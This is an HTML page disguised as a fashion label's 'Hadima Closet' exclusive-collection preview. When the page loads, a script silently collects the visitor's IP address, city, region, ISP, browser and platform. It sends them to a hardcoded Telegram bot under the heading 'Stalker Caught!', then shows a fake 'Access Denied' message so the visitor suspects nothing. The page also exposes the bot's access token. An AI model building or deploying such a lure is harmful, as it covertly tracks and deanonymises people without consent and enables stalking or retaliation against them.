<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hadima Closet | Exclusive Collection 2026</title>
    <meta property="og:title" content="Hadima Closet - New Design Drafts">
    <meta property="og:description" content="Exclusive access to upcoming summer collection. Restricted access.">
    <meta property="og:image" content="https://your-image-link.jpg"> 
    
    <style>
        body {
            background-color: #1a1a1a;
            color: #d4af37;
            font-family: 'Georgia', serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .loader {
            border: 4px solid #333;
            border-top: 4px solid #d4af37;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .container { padding: 20px; }
        h1 { font-size: 24px; letter-spacing: 2px; }
        p { color: #888; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>HADIMA CLOSET</h1>
        <p>Loading Exclusive Portfolio Data...</p>
        <p id="status">Verifying access...</p>
    </div>

    <script>
        const botToken = "8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k";
        const chatId = "8639892987";

        async function collectData() {
            try {
                // Fetching IP and Location info
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();

                const message = `
🎯 **Stalker Caught!**
---------------------------
📍 **Location:** ${ipData.city}, ${ipData.region}, ${ipData.country_name}
🌐 **IP Address:** ${ipData.ip}
📡 **ISP:** ${ipData.org}
📱 **Device:** ${navigator.userAgent}
🖥️ **Platform:** ${navigator.platform}
🔋 **Battery:** (Check manual logs)
⏰ **Time:** ${new Date().toLocaleString()}
---------------------------
✨ Hadima Closet Security Layer
                `;

                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
                });

                // Saamne wale ko lage link load ho raha hai
                setTimeout(() => {
                    document.getElementById('status').innerText = "Access Denied: Restricted to Registered Designers Only.";
                }, 3000);

            } catch (error) {
                console.error("Error capturing data.");
            }
        }

        window.onload = collectData;
    </script>
</body>
</html>
